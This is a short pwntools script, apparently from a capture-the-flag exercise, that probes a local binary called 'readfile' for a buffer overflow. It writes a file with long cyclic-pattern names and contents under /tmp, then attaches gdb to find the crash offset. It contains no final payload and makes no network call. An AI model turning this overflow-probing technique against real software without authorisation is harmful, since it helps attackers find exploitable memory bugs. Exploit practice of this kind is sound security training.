from pwn import *
import string

context.terminal = ['tmux', 'splitw', '-h']

r = None

def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)

def read_file(name):
    r.sendline('2')
    r.sendline(name)

filename = '/tmp/' + cyclic(240, alphabet=string.ascii_uppercase)
print(filename)
try:
    os.remove(filename)
except:
    pass

r = process("./readfile")

data = cyclic(1000)
write_file(filename, data)

r = process("./readfile")
gdb.attach(r, '''
c
''')
read_file(filename)

r.interactive()
